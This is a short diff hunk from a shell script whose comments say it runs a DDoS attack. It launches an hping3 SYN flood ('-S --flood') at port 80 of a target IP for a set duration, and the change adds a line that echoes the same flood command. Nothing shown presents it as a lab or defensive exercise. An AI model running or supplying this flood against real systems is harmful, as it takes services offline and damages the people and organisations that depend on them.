@@ -8,6 +8,7 @@ DURATION=30
 
 # Run the DDoS attack using hping3
 echo "Starting DDoS attack on $TARGET_IP for $DURATION seconds..."
+echo "hping3 -S --flood -V -p 80 $TARGET_IP"
 hping3 -S --flood -V -p 80 $TARGET_IP &
 HPING3_PID=$!
 
